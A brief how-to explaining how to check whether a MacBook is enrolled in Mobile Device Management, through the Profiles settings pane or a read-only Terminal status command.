To determine if your MacBook is enrolled in Mobile Device Management (MDM), open the Apple menu and select 'System Settings' (macOS 13 and later) or 'System Preferences' (macOS 12 and earlier). Navigate to 'Profiles' or 'Profiles & Device Management'; if you see a profile named 'Device Enrollment Program' or similar, your MacBook is enrolled in MDM. Alternatively, open Terminal and type:

```sh
profiles status -type enrollment
```

if it returns 'Enrolled via DEP: Yes' and 'MDM enrollment: Yes (User Approved)', your MacBook is enrolled in MDM.
